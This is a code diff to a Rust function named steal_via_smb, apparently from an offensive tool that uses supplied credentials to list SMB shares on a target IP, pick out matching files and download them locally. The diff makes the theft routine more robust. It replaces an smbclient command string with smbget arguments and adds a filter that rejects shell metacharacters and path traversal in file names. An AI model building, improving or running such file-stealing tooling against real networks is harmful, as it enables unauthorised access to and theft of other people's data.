@@ -105,7 +105,7 @@ async fn steal_via_smb(
             _ => continue,
         };
 
-        // Parse file listings and find matches
+        // Parse file listings and find matches, rejecting unsafe filenames
         let matching: Vec<String> = files_stdout
             .lines()
             .filter(|l| {
@@ -117,25 +117,28 @@ async fn steal_via_smb(
                 let trimmed = l.trim();
                 trimmed.split_whitespace().next().map(|s| s.to_string())
             })
+            .filter(|f| is_safe_filename(f))
             .collect();
 
         let share_dir = local_dir.join(share);
         let _ = tokio::fs::create_dir_all(&share_dir).await;
 
-        // Step 3: Download matching files
+        // Step 3: Download matching files — use separate args to avoid shell injection
         for file in &matching {
-            let get_cmd = format!("get \"{file}\" \"{}/{}\"",
-                share_dir.display(),
-                file.rsplit('/').next().unwrap_or(file));
-
-            let _ = tokio::process::Command::new("smbclient")
+            let local_name = file.rsplit('/').next().unwrap_or(file);
+            if !is_safe_filename(local_name) {
+                continue;
+            }
+            let local_path = share_dir.join(local_name);
+            // Use smbget instead of smbclient -c to avoid command string injection
+            let _ = tokio::process::Command::new("smbget")
                 .args([
-                    &format!("//{ip}/{share}"),
+                    &format!("smb://{ip}/{share}/{file}"),
                     "-U",
                     &format!("{user}%{password}"),
-                    "--timeout=10",
-                    "-c",
-                    &get_cmd,
+                    "-o",
+                    local_path.to_str().unwrap_or_default(),
+                    "--no-check-certificate",
                 ])
                 .status()
                 .await;
@@ -145,4 +148,18 @@ async fn steal_via_smb(
     }
 
     Ok(total)
+}
+
+/// Reject filenames with shell metacharacters or path traversal.
+fn is_safe_filename(name: &str) -> bool {
+    !name.is_empty()
+        && !name.contains("..")
+        && !name.contains(';')
+        && !name.contains('`')
+        && !name.contains('$')
+        && !name.contains('|')
+        && !name.contains('&')
+        && !name.contains('\n')
+        && !name.contains('\r')
+        && !name.contains('\0')
 }
